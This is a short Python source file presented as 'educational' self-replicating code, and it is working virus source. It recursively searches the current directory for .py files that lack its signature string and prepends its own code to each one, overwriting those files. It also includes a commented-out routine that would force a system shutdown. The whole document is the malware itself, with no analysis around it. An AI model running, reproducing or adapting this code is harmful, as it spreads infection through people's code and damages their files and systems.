"""
author = Angelo Giacco
INTENDED FOR EDUCATIONAL PURPOSES ONLY
SELF REPLICATING CODE
"""
import os
import datetime
SIGNATURE = "THENK YOU VERY GRAZIE"
def search(path):
    fi = []
    fl = os.listdir(path)
    for fn in fl:
        if os.path.isdir(path+"/"+fn):
            fi.extend(search(path+"/"+fn))
        elif fn[-3:] == ".py":
            inf = False
            for l in open(path+"/"+fn):
                if SIGNATURE in l:
                    inf = True
                    break
            if inf == False:
                fi.append(path+"/"+fn)
    return fi
def penetrate(fi):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close()
    for fn in fi:
        f = open(fn)
        temp = f.read()
        f.close()
        f = open(fn,"w")
        f.write(virusstring + temp)
        f.close()
#def nuke():
    #os.system("shutdown /p /f")
fi = search(os.path.abspath(""))
penetrate(fi)
#nuke()
